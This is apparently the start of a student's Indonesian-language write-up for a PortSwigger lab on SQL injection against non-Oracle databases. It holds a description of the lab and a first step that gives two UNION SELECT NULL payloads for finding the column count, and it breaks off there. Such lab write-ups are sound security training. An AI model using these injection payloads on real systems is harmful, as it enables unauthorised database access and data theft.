# SQL Injection Lab - PortSwigger

**Nama:** [isi nama lo]  
**Tanggal:** 2026-07-26  
**Lab:** SQL injection attack, listing the database contents on non-Oracle databases

---

## Deskripsi Lab
Lab ini bertujuan untuk mengeksploitasi celah SQL Injection pada parameter `category` untuk mengambil daftar tabel, kolom, dan data sensitif dari database.

---

## Langkah-Langkah

### 1. Menentukan Jumlah Kolom
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--